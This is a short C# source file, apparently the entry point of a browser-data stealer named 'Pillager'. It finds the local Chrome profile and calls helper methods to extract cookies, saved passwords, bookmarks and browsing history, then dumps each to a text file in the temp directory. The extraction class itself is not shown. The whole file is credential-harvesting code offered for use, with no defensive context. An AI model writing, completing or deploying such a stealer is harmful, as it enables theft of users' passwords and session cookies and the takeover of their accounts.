using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.GetTempPath();
            string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default");
            Chrome chrome = new Chrome("Chrome", chromepath);
            string cookies = chrome.Chrome_cookies();
            string passwords = chrome.Chrome_passwords();
            string books = chrome.Chrome_books();
            string history = chrome.Chrome_history();
            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_cookies.txt"), cookies);
            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_passwords.txt"), passwords);
            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_books.txt"), books);
            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_history.txt"), history);
            Console.WriteLine("Files wrote to " + savepath + chrome.BrowserName + "_*.txt");
        }
    }
}
